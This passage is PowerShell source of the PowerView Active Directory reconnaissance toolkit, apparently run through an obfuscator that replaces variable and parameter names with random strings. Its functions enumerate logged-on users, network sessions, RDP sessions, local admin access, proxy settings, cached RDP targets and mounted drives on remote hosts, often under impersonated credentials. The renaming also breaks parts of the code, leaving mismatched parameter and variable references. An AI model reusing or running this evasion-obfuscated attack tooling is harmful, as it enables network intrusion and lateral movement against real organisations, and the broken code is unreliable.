                Write-Verbose "[Get-NetShare] Error: $(([ComponentModel.Win32Exception] $2KUDvV2HojTSzhMzNmslFPRL).Message)"
            }
        }
    }

    END {
        if ($QWX1OeqTMV876JyRF) {
            Invoke-RevertToSelf -5 $QWX1OeqTMV876JyRF
        }
    }
}


function Get-NetLoggedon {


    [OutputType('PowerView.LoggedOnUserInfo')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $mA = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $3ezVSfm6f4k = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $QWX1OeqTMV876JyRF = Invoke-UserImpersonation -3ezVSfm6f4k $3ezVSfm6f4k
        }
    }

    PROCESS {
        ForEach ($TfIJKo1L in $mA) {
            
            $U2xi7eoz5f0xgHEMni = 1
            $bmkq67sA3ALUu13wNpA7pV1 = [IntPtr]::Zero
            $EntriesReadlBz3e8lEw8sdMr8E1dYsS = 0
            $69F8qblRMGAcCGmjxKTWXouM = 0
            $iJWGI = 0

            
            $2KUDvV2HojTSzhMzNmslFPRL = $jmL9QM8qOyJ0k::NetWkstaUserEnum($TfIJKo1L, $U2xi7eoz5f0xgHEMni, [ref]$bmkq67sA3ALUu13wNpA7pV1, -1, [ref]$EntriesReadlBz3e8lEw8sdMr8E1dYsS, [ref]$69F8qblRMGAcCGmjxKTWXouM, [ref]$iJWGI)

            
            $2iCxJSbEZDQFphllc9F = $bmkq67sA3ALUu13wNpA7pV1.ToInt64()

            
            if (($2KUDvV2HojTSzhMzNmslFPRL -eq 0) -and ($2iCxJSbEZDQFphllc9F -gt 0)) {

                
                $kUONtubjrVMELIws = $WLGzd3yQxk::GetSize()

                
                for ($RGKU3QpH = 0; ($RGKU3QpH -lt $EntriesReadlBz3e8lEw8sdMr8E1dYsS); $RGKU3QpH++) {
                    
                    $vKDIY5WdQizyLZ4rDCi = New-Object System.Intptr -ArgumentList $2iCxJSbEZDQFphllc9F
                    $vWCMTsyOgr08a = $vKDIY5WdQizyLZ4rDCi -as $WLGzd3yQxk

                    
                    $2e3BP7WOnIarsMCNUHlgq5 = $vWCMTsyOgr08a | Select-Object *
                    $2e3BP7WOnIarsMCNUHlgq5 | Add-Member Noteproperty 'ComputerName' $TfIJKo1L
                    $2e3BP7WOnIarsMCNUHlgq5.PSObject.TypeNames.Insert(0, 'PowerView.LoggedOnUserInfo')
                    $2iCxJSbEZDQFphllc9F = $vKDIY5WdQizyLZ4rDCi.ToInt64()
                    $2iCxJSbEZDQFphllc9F += $kUONtubjrVMELIws
                    $2e3BP7WOnIarsMCNUHlgq5
                }

                
                $qYFR5PCZruUkdna9T = $jmL9QM8qOyJ0k::NetApiBufferFree($bmkq67sA3ALUu13wNpA7pV1)
            }
            else {
                Write-Verbose "[Get-NetLoggedon] Error: $(([ComponentModel.Win32Exception] $2KUDvV2HojTSzhMzNmslFPRL).Message)"
            }
        }
    }

    END {
        if ($QWX1OeqTMV876JyRF) {
            Invoke-RevertToSelf -5 $QWX1OeqTMV876JyRF
        }
    }
}


function Get-NetSession {


    [OutputType('PowerView.SessionInfo')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $mA = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $3ezVSfm6f4k = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $QWX1OeqTMV876JyRF = Invoke-UserImpersonation -3ezVSfm6f4k $3ezVSfm6f4k
        }
    }

    PROCESS {
        ForEach ($TfIJKo1L in $mA) {
            
            $U2xi7eoz5f0xgHEMni = 10
            $bmkq67sA3ALUu13wNpA7pV1 = [IntPtr]::Zero
            $EntriesReadlBz3e8lEw8sdMr8E1dYsS = 0
            $69F8qblRMGAcCGmjxKTWXouM = 0
            $iJWGI = 0

            
            $2KUDvV2HojTSzhMzNmslFPRL = $jmL9QM8qOyJ0k::NetSessionEnum($TfIJKo1L, '', $mOi9D, $U2xi7eoz5f0xgHEMni, [ref]$bmkq67sA3ALUu13wNpA7pV1, -1, [ref]$EntriesReadlBz3e8lEw8sdMr8E1dYsS, [ref]$69F8qblRMGAcCGmjxKTWXouM, [ref]$iJWGI)

            
            $2iCxJSbEZDQFphllc9F = $bmkq67sA3ALUu13wNpA7pV1.ToInt64()

            
            if (($2KUDvV2HojTSzhMzNmslFPRL -eq 0) -and ($2iCxJSbEZDQFphllc9F -gt 0)) {

                
                $kUONtubjrVMELIws = $wmMIjOxaozAy4Gusyvn::GetSize()

                
                for ($RGKU3QpH = 0; ($RGKU3QpH -lt $EntriesReadlBz3e8lEw8sdMr8E1dYsS); $RGKU3QpH++) {
                    
                    $vKDIY5WdQizyLZ4rDCi = New-Object System.Intptr -ArgumentList $2iCxJSbEZDQFphllc9F
                    $vWCMTsyOgr08a = $vKDIY5WdQizyLZ4rDCi -as $wmMIjOxaozAy4Gusyvn

                    
                    $l529BE76FpyXrkI = $vWCMTsyOgr08a | Select-Object *
                    $l529BE76FpyXrkI | Add-Member Noteproperty 'ComputerName' $TfIJKo1L
                    $l529BE76FpyXrkI.PSObject.TypeNames.Insert(0, 'PowerView.SessionInfo')
                    $2iCxJSbEZDQFphllc9F = $vKDIY5WdQizyLZ4rDCi.ToInt64()
                    $2iCxJSbEZDQFphllc9F += $kUONtubjrVMELIws
                    $l529BE76FpyXrkI
                }

                
                $qYFR5PCZruUkdna9T = $jmL9QM8qOyJ0k::NetApiBufferFree($bmkq67sA3ALUu13wNpA7pV1)
            }
            else {
                Write-Verbose "[Get-NetSession] Error: $(([ComponentModel.Win32Exception] $2KUDvV2HojTSzhMzNmslFPRL).Message)"
            }
        }
    }


    END {
        if ($QWX1OeqTMV876JyRF) {
            Invoke-RevertToSelf -5 $QWX1OeqTMV876JyRF
        }
    }
}


function Get-RegLoggedOn {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.RegLoggedOnUser')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $mA = 'localhost'
    )

    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $QWX1OeqTMV876JyRF = Invoke-UserImpersonation -3ezVSfm6f4k $3ezVSfm6f4k
        }
    }

    PROCESS {
        ForEach ($TfIJKo1L in $mA) {
            try {
                
                $XSLwNlARJQ1HG = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('Users', "$mA")

                
                $XSLwNlARJQ1HG.GetSubKeyNames() | Where-Object { $_ -match 'S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+$' } | ForEach-Object {
                    $mOi9D = ConvertFrom-SID -iQFdt $_ -YSu8jzco2Jt 'DomainSimple'

                    if ($mOi9D) {
                        $mOi9D, $hZmS = $mOi9D.Split('@')
                    }
                    else {
                        $mOi9D = $_
                        $hZmS = $qYFR5PCZruUkdna9T
                    }

                    $3lvdRJPfN9YmxETbkQSrGKDCn = New-Object PSObject
                    $3lvdRJPfN9YmxETbkQSrGKDCn | Add-Member Noteproperty 'ComputerName' "$mA"
                    $3lvdRJPfN9YmxETbkQSrGKDCn | Add-Member Noteproperty 'UserDomain' $hZmS
                    $3lvdRJPfN9YmxETbkQSrGKDCn | Add-Member Noteproperty 'UserName' $mOi9D
                    $3lvdRJPfN9YmxETbkQSrGKDCn | Add-Member Noteproperty 'UserSID' $_
                    $3lvdRJPfN9YmxETbkQSrGKDCn.PSObject.TypeNames.Insert(0, 'PowerView.RegLoggedOnUser')
                    $3lvdRJPfN9YmxETbkQSrGKDCn
                }
            }
            catch {
                Write-Verbose "[Get-RegLoggedOn] Error opening remote registry on '$mA' : $_"
            }
        }
    }

    END {
        if ($QWX1OeqTMV876JyRF) {
            Invoke-RevertToSelf -5 $QWX1OeqTMV876JyRF
        }
    }
}


function Get-NetRDPSession {


    [OutputType('PowerView.RDPSessionInfo')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $mA = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $3ezVSfm6f4k = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $QWX1OeqTMV876JyRF = Invoke-UserImpersonation -3ezVSfm6f4k $3ezVSfm6f4k
        }
    }

    PROCESS {
        ForEach ($TfIJKo1L in $mA) {

            
            $pvktzSNjJQdIPo9uMxDyhT = $jJ7mH9O0sX::WTSOpenServerEx($TfIJKo1L)

            
            if ($pvktzSNjJQdIPo9uMxDyhT -ne 0) {

                
                $8sBjdTDueA = [IntPtr]::Zero
                $W6Z2yw04D = 0

                
                $2KUDvV2HojTSzhMzNmslFPRL = $jJ7mH9O0sX::WTSEnumerateSessionsEx($pvktzSNjJQdIPo9uMxDyhT, [ref]1, 0, [ref]$8sBjdTDueA, [ref]$W6Z2yw04D);$ZPR8SXJ1J = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

                
                $2iCxJSbEZDQFphllc9F = $8sBjdTDueA.ToInt64()

                if (($2KUDvV2HojTSzhMzNmslFPRL -ne 0) -and ($2iCxJSbEZDQFphllc9F -gt 0)) {

                    
                    $kUONtubjrVMELIws = $AZy::GetSize()

                    
                    for ($RGKU3QpH = 0; ($RGKU3QpH -lt $W6Z2yw04D); $RGKU3QpH++) {

                        
                        $vKDIY5WdQizyLZ4rDCi = New-Object System.Intptr -ArgumentList $2iCxJSbEZDQFphllc9F
                        $vWCMTsyOgr08a = $vKDIY5WdQizyLZ4rDCi -as $AZy

                        $JBc3FwTngvqOk17KrXx2uEdL = New-Object PSObject

                        if ($vWCMTsyOgr08a.pHostName) {
                            $JBc3FwTngvqOk17KrXx2uEdL | Add-Member Noteproperty 'ComputerName' $vWCMTsyOgr08a.pHostName
                        }
                        else {
                            
                            $JBc3FwTngvqOk17KrXx2uEdL | Add-Member Noteproperty 'ComputerName' $TfIJKo1L
                        }

                        $JBc3FwTngvqOk17KrXx2uEdL | Add-Member Noteproperty 'SessionName' $vWCMTsyOgr08a.pSessionName

                        if ($(-not $vWCMTsyOgr08a.pDomainName) -or ($vWCMTsyOgr08a.pDomainName -eq '')) {
                            
                            $JBc3FwTngvqOk17KrXx2uEdL | Add-Member Noteproperty 'UserName' "$($vWCMTsyOgr08a.pUserName)"
                        }
                        else {
                            $JBc3FwTngvqOk17KrXx2uEdL | Add-Member Noteproperty 'UserName' "$($vWCMTsyOgr08a.pDomainName)\$($vWCMTsyOgr08a.pUserName)"
                        }

                        $JBc3FwTngvqOk17KrXx2uEdL | Add-Member Noteproperty 'ID' $vWCMTsyOgr08a.SessionID
                        $JBc3FwTngvqOk17KrXx2uEdL | Add-Member Noteproperty 'State' $vWCMTsyOgr08a.State

                        $8pNgR0dHG = [IntPtr]::Zero
                        $fpFDAut5 = 0

                        
                        
                        $Result2ubL6QWXkXvEbOeWOEk = $jJ7mH9O0sX::WTSQuerySessionInformation($pvktzSNjJQdIPo9uMxDyhT, $vWCMTsyOgr08a.SessionID, 14, [ref]$8pNgR0dHG, [ref]$fpFDAut5);$oRJxdBPVgED = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

                        if ($Result2ubL6QWXkXvEbOeWOEk -eq 0) {
                            Write-Verbose "[Get-NetRDPSession] Error: $(([ComponentModel.Win32Exception] $oRJxdBPVgED).Message)"
                        }
                        else {
                            $1pGeR = $8pNgR0dHG.ToInt64()
                            $5kn2rNGpJQFSq9cwY = New-Object System.Intptr -ArgumentList $1pGeR
                            $WzcQ26fOAJmydU9uMNV3ePKng = $5kn2rNGpJQFSq9cwY -as $9noUdPiNJ

                            $hay1gVwbrJG0SL2R = $WzcQ26fOAJmydU9uMNV3ePKng.Address
                            if ($hay1gVwbrJG0SL2R[2] -ne 0) {
                                $hay1gVwbrJG0SL2R = [String]$hay1gVwbrJG0SL2R[2]+'.'+[String]$hay1gVwbrJG0SL2R[3]+'.'+[String]$hay1gVwbrJG0SL2R[4]+'.'+[String]$hay1gVwbrJG0SL2R[5]
                            }
                            else {
                                $hay1gVwbrJG0SL2R = $qYFR5PCZruUkdna9T
                            }

                            $JBc3FwTngvqOk17KrXx2uEdL | Add-Member Noteproperty 'SourceIP' $hay1gVwbrJG0SL2R
                            $JBc3FwTngvqOk17KrXx2uEdL.PSObject.TypeNames.Insert(0, 'PowerView.RDPSessionInfo')
                            $JBc3FwTngvqOk17KrXx2uEdL

                            
                            $qYFR5PCZruUkdna9T = $jJ7mH9O0sX::WTSFreeMemory($8pNgR0dHG)

                            $2iCxJSbEZDQFphllc9F += $kUONtubjrVMELIws
                        }
                    }
                    
                    $qYFR5PCZruUkdna9T = $jJ7mH9O0sX::WTSFreeMemoryEx(2, $8sBjdTDueA, $W6Z2yw04D)
                }
                else {
                    Write-Verbose "[Get-NetRDPSession] Error: $(([ComponentModel.Win32Exception] $ZPR8SXJ1J).Message)"
                }
                
                $qYFR5PCZruUkdna9T = $jJ7mH9O0sX::WTSCloseServer($pvktzSNjJQdIPo9uMxDyhT)
            }
            else {
                Write-Verbose "[Get-NetRDPSession] Error opening the Remote Desktop Session Host (RD Session Host) server for: $mA"
            }
        }
    }

    END {
        if ($QWX1OeqTMV876JyRF) {
            Invoke-RevertToSelf -5 $QWX1OeqTMV876JyRF
        }
    }
}


function Test-AdminAccess {


    [OutputType('PowerView.AdminAccess')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $mA = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $3ezVSfm6f4k = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $QWX1OeqTMV876JyRF = Invoke-UserImpersonation -3ezVSfm6f4k $3ezVSfm6f4k
        }
    }

    PROCESS {
        ForEach ($TfIJKo1L in $mA) {
            
            
            $pvktzSNjJQdIPo9uMxDyhT = $b8ZFNi9uGrz0TyhMxtc2s3R5Q::OpenSCManagerW("\\$TfIJKo1L", 'ServicesActive', 0xF003F);$ZPR8SXJ1J = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

            $rSLqGkpIcE = New-Object PSObject
            $rSLqGkpIcE | Add-Member Noteproperty 'ComputerName' $TfIJKo1L

            
            if ($pvktzSNjJQdIPo9uMxDyhT -ne 0) {
                $qYFR5PCZruUkdna9T = $b8ZFNi9uGrz0TyhMxtc2s3R5Q::CloseServiceHandle($pvktzSNjJQdIPo9uMxDyhT)
                $rSLqGkpIcE | Add-Member Noteproperty 'IsAdmin' $True
            }
            else {
                Write-Verbose "[Test-AdminAccess] Error: $(([ComponentModel.Win32Exception] $ZPR8SXJ1J).Message)"
                $rSLqGkpIcE | Add-Member Noteproperty 'IsAdmin' $False
            }
            $rSLqGkpIcE.PSObject.TypeNames.Insert(0, 'PowerView.AdminAccess')
            $rSLqGkpIcE
        }
    }

    END {
        if ($QWX1OeqTMV876JyRF) {
            Invoke-RevertToSelf -5 $QWX1OeqTMV876JyRF
        }
    }
}


function Get-NetComputerSiteName {


    [OutputType('PowerView.ComputerSite')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $mA = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $3ezVSfm6f4k = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $QWX1OeqTMV876JyRF = Invoke-UserImpersonation -3ezVSfm6f4k $3ezVSfm6f4k
        }
    }

    PROCESS {
        ForEach ($TfIJKo1L in $mA) {
            
            if ($TfIJKo1L -match '^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$') {
                $k4HcYJqy3V0FRNTtEXW = $TfIJKo1L
                $TfIJKo1L = [System.Net.Dns]::GetHostByAddress($TfIJKo1L) | Select-Object -ExpandProperty HostName
            }
            else {
                $k4HcYJqy3V0FRNTtEXW = @(Resolve-IPAddress -mA $TfIJKo1L)[0].IPAddress
            }

            $bmkq67sA3ALUu13wNpA7pV1 = [IntPtr]::Zero

            $2KUDvV2HojTSzhMzNmslFPRL = $jmL9QM8qOyJ0k::DsGetSiteName($TfIJKo1L, [ref]$bmkq67sA3ALUu13wNpA7pV1)

            $NnUfVdKjO5siuteHmb = New-Object PSObject
            $NnUfVdKjO5siuteHmb | Add-Member Noteproperty 'ComputerName' $TfIJKo1L
            $NnUfVdKjO5siuteHmb | Add-Member Noteproperty 'IPAddress' $k4HcYJqy3V0FRNTtEXW

            if ($2KUDvV2HojTSzhMzNmslFPRL -eq 0) {
                $M6Sb30DA = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($bmkq67sA3ALUu13wNpA7pV1)
                $NnUfVdKjO5siuteHmb | Add-Member Noteproperty 'SiteName' $M6Sb30DA
            }
            else {
                Write-Verbose "[Get-NetComputerSiteName] Error: $(([ComponentModel.Win32Exception] $2KUDvV2HojTSzhMzNmslFPRL).Message)"
                $NnUfVdKjO5siuteHmb | Add-Member Noteproperty 'SiteName' ''
            }
            $NnUfVdKjO5siuteHmb.PSObject.TypeNames.Insert(0, 'PowerView.ComputerSite')

            
            $qYFR5PCZruUkdna9T = $jmL9QM8qOyJ0k::NetApiBufferFree($bmkq67sA3ALUu13wNpA7pV1)

            $NnUfVdKjO5siuteHmb
        }
    }

    END {
        if ($QWX1OeqTMV876JyRF) {
            Invoke-RevertToSelf -5 $QWX1OeqTMV876JyRF
        }
    }
}


function Get-WMIRegProxy {


    [OutputType('PowerView.ProxySettings')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $mA = $8MSydlAwkKhVgnu4Ls10:COMPUTERNAME,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $3ezVSfm6f4k = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        ForEach ($TfIJKo1L in $mA) {
            try {
                $m4PiGHAzU = @{
                    'List' = $True
                    'Class' = 'StdRegProv'
                    'Namespace' = 'root\default'
                    'Computername' = $TfIJKo1L
                    'ErrorAction' = 'Stop'
                }
                if ($PSBoundParameters['Credential']) { $m4PiGHAzU['Credential'] = $3ezVSfm6f4k }

                $nZctQEw3Nl = Get-WmiObject @WmiArguments
                $FcI0EDWeGRPBgi9YlykU = 'SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings'

                
                $UhK = 2147483649
                $klcyUE8onNxq2RvG5SVp = $nZctQEw3Nl.GetStringValue($UhK, $FcI0EDWeGRPBgi9YlykU, 'ProxyServer').sValue
                $pPICXGPfHnoNB3U13OWh11MV = $nZctQEw3Nl.GetStringValue($UhK, $FcI0EDWeGRPBgi9YlykU, 'AutoConfigURL').sValue

                $uvAQoCNLex3DrdFHaWpi = ''
                if ($pPICXGPfHnoNB3U13OWh11MV -and ($pPICXGPfHnoNB3U13OWh11MV -ne '')) {
                    try {
                        $uvAQoCNLex3DrdFHaWpi = (New-Object Net.WebClient).DownloadString($pPICXGPfHnoNB3U13OWh11MV)
                    }
                    catch {
                        Write-Warning "[Get-WMIRegProxy] Error connecting to AutoConfigURL : $pPICXGPfHnoNB3U13OWh11MV"
                    }
                }

                if ($klcyUE8onNxq2RvG5SVp -or $pPICXGPfHnoNB3U13OWh11MV) {
                    $TxOjsKu13lUSJ8MHybpYNF = New-Object PSObject
                    $TxOjsKu13lUSJ8MHybpYNF | Add-Member Noteproperty 'ComputerName' $TfIJKo1L
                    $TxOjsKu13lUSJ8MHybpYNF | Add-Member Noteproperty 'ProxyServer' $klcyUE8onNxq2RvG5SVp
                    $TxOjsKu13lUSJ8MHybpYNF | Add-Member Noteproperty 'AutoConfigURL' $pPICXGPfHnoNB3U13OWh11MV
                    $TxOjsKu13lUSJ8MHybpYNF | Add-Member Noteproperty 'Wpad' $uvAQoCNLex3DrdFHaWpi
                    $TxOjsKu13lUSJ8MHybpYNF.PSObject.TypeNames.Insert(0, 'PowerView.ProxySettings')
                    $TxOjsKu13lUSJ8MHybpYNF
                }
                else {
                    Write-Warning "[Get-WMIRegProxy] No proxy settings found for $mA"
                }
            }
            catch {
                Write-Warning "[Get-WMIRegProxy] Error enumerating proxy settings for $mA : $_"
            }
        }
    }
}


function Get-WMIRegLastLoggedOn {


    [OutputType('PowerView.LastLoggedOnUser')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $mA = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $3ezVSfm6f4k = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        ForEach ($TfIJKo1L in $mA) {
            
            $3Oif4UlbeBuP = 2147483650

            $m4PiGHAzU = @{
                'List' = $True
                'Class' = 'StdRegProv'
                'Namespace' = 'root\default'
                'Computername' = $TfIJKo1L
                'ErrorAction' = 'SilentlyContinue'
            }
            if ($PSBoundParameters['Credential']) { $m4PiGHAzU['Credential'] = $3ezVSfm6f4k }

            
            try {
                $XSLwNlARJQ1HG = Get-WmiObject @WmiArguments

                $FcI0EDWeGRPBgi9YlykU = 'SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\LogonUI'
                $BqU = 'LastLoggedOnUser'
                $gfdpa3eQ7L51cIO = $XSLwNlARJQ1HG.GetStringValue($3Oif4UlbeBuP, $FcI0EDWeGRPBgi9YlykU, $BqU).sValue

                $Gil = New-Object PSObject
                $Gil | Add-Member Noteproperty 'ComputerName' $TfIJKo1L
                $Gil | Add-Member Noteproperty 'LastLoggedOn' $gfdpa3eQ7L51cIO
                $Gil.PSObject.TypeNames.Insert(0, 'PowerView.LastLoggedOnUser')
                $Gil
            }
            catch {
                Write-Warning "[Get-WMIRegLastLoggedOn] Error opening remote registry on $TfIJKo1L. Remote registry likely not enabled."
            }
        }
    }
}


function Get-WMIRegCachedRDPConnection {


    [OutputType('PowerView.CachedRDPConnection')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $mA = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $3ezVSfm6f4k = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        ForEach ($TfIJKo1L in $mA) {
            
            $fG9ryRoW5rRO1 = 2147483651

            $m4PiGHAzU = @{
                'List' = $True
                'Class' = 'StdRegProv'
                'Namespace' = 'root\default'
                'Computername' = $TfIJKo1L
                'ErrorAction' = 'Stop'
            }
            if ($PSBoundParameters['Credential']) { $m4PiGHAzU['Credential'] = $3ezVSfm6f4k }

            try {
                $XSLwNlARJQ1HG = Get-WmiObject @WmiArguments

                
                $FPZ = ($XSLwNlARJQ1HG.EnumKey($fG9ryRoW5rRO1, '')).sNames | Where-Object { $_ -match 'S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+$' }

                ForEach ($ubWdhCNpBgXQAxRM in $FPZ) {
                    try {
                        if ($PSBoundParameters['Credential']) {
                            $mOi9D = ConvertFrom-SID -iQFdt $ubWdhCNpBgXQAxRM -3ezVSfm6f4k $3ezVSfm6f4k
                        }
                        else {
                            $mOi9D = ConvertFrom-SID -iQFdt $ubWdhCNpBgXQAxRM
                        }

                        
                        $aSmGRs = $XSLwNlARJQ1HG.EnumValues($fG9ryRoW5rRO1,"$ubWdhCNpBgXQAxRM\Software\Microsoft\Terminal Server Client\Default").sNames

                        ForEach ($gw5jRkQiYE3U0ayml in $aSmGRs) {
                            
                            if ($gw5jRkQiYE3U0ayml -match 'MRU.*') {
                                $cbj2tZpsR9CJP = $XSLwNlARJQ1HG.GetStringValue($fG9ryRoW5rRO1, "$ubWdhCNpBgXQAxRM\Software\Microsoft\Terminal Server Client\Default", $gw5jRkQiYE3U0ayml).sValue

                                $ejk4 = New-Object PSObject
                                $ejk4 | Add-Member Noteproperty 'ComputerName' $TfIJKo1L
                                $ejk4 | Add-Member Noteproperty 'UserName' $mOi9D
                                $ejk4 | Add-Member Noteproperty 'UserSID' $ubWdhCNpBgXQAxRM
                                $ejk4 | Add-Member Noteproperty 'TargetServer' $cbj2tZpsR9CJP
                                $ejk4 | Add-Member Noteproperty 'UsernameHint' $qYFR5PCZruUkdna9T
                                $ejk4.PSObject.TypeNames.Insert(0, 'PowerView.CachedRDPConnection')
                                $ejk4
                            }
                        }

                        
                        $3YgfLEPMl3eqF8z = $XSLwNlARJQ1HG.EnumKey($fG9ryRoW5rRO1,"$ubWdhCNpBgXQAxRM\Software\Microsoft\Terminal Server Client\Servers").sNames

                        ForEach ($Gkd0Hz5f in $3YgfLEPMl3eqF8z) {

                            $ycTGroNJxD8Ia6iV = $XSLwNlARJQ1HG.GetStringValue($fG9ryRoW5rRO1, "$ubWdhCNpBgXQAxRM\Software\Microsoft\Terminal Server Client\Servers\$Gkd0Hz5f", 'UsernameHint').sValue

                            $ejk4 = New-Object PSObject
                            $ejk4 | Add-Member Noteproperty 'ComputerName' $TfIJKo1L
                            $ejk4 | Add-Member Noteproperty 'UserName' $mOi9D
                            $ejk4 | Add-Member Noteproperty 'UserSID' $ubWdhCNpBgXQAxRM
                            $ejk4 | Add-Member Noteproperty 'TargetServer' $Gkd0Hz5f
                            $ejk4 | Add-Member Noteproperty 'UsernameHint' $ycTGroNJxD8Ia6iV
                            $ejk4.PSObject.TypeNames.Insert(0, 'PowerView.CachedRDPConnection')
                            $ejk4
                        }
                    }
                    catch {
                        Write-Verbose "[Get-WMIRegCachedRDPConnection] Error: $_"
                    }
                }
            }
            catch {
                Write-Warning "[Get-WMIRegCachedRDPConnection] Error accessing $TfIJKo1L, likely insufficient permissions or firewall rules on host: $_"
            }
        }
    }
}


function Get-WMIRegMountedDrive {


    [OutputType('PowerView.RegMountedDrive')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $mA = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $3ezVSfm6f4k = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        ForEach ($TfIJKo1L in $mA) {
            
            $fG9ryRoW5rRO1 = 2147483651

            $m4PiGHAzU = @{
                'List' = $True
                'Class' = 'StdRegProv'
                'Namespace' = 'root\default'
                'Computername' = $TfIJKo1L
                'ErrorAction' = 'Stop'
            }
            if ($PSBoundParameters['Credential']) { $m4PiGHAzU['Credential'] = $3ezVSfm6f4k }

            try {
                $XSLwNlARJQ1HG = Get-WmiObject @WmiArguments

                
                $FPZ = ($XSLwNlARJQ1HG.EnumKey($fG9ryRoW5rRO1, '')).sNames | Where-Object { $_ -match 'S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+$' }

                ForEach ($ubWdhCNpBgXQAxRM in $FPZ) {
                    try {
                        if ($PSBoundParameters['Credential']) {
                            $mOi9D = ConvertFrom-SID -iQFdt $ubWdhCNpBgXQAxRM -3ezVSfm6f4k $3ezVSfm6f4k
                        }
                        else {
                            $mOi9D = ConvertFrom-SID -iQFdt $ubWdhCNpBgXQAxRM
                        }

                        $uU = ($XSLwNlARJQ1HG.EnumKey($fG9ryRoW5rRO1, "$ubWdhCNpBgXQAxRM\Network")).sNames

                        ForEach ($9fxArYSf9LAG36tuVOghn7 in $uU) {
                            $nRhCNH7SkXlDKbA = $XSLwNlARJQ1HG.GetStringValue($fG9ryRoW5rRO1, "$ubWdhCNpBgXQAxRM\Network\$9fxArYSf9LAG36tuVOghn7", 'ProviderName').sValue
                            $PQVWqPQthC93I6 = $XSLwNlARJQ1HG.GetStringValue($fG9ryRoW5rRO1, "$ubWdhCNpBgXQAxRM\Network\$9fxArYSf9LAG36tuVOghn7", 'RemotePath').sValue
                            $APeAKkxr = $XSLwNlARJQ1HG.GetStringValue($fG9ryRoW5rRO1, "$ubWdhCNpBgXQAxRM\Network\$9fxArYSf9LAG36tuVOghn7", 'UserName').sValue
                            if (-not $mOi9D) { $mOi9D = '' }

                            if ($PQVWqPQthC93I6 -and ($PQVWqPQthC93I6 -ne '')) {
                                $A = New-Object PSObject
                                $A | Add-Member Noteproperty 'ComputerName' $TfIJKo1L
                                $A | Add-Member Noteproperty 'UserName' $mOi9D
                                $A | Add-Member Noteproperty 'UserSID' $ubWdhCNpBgXQAxRM
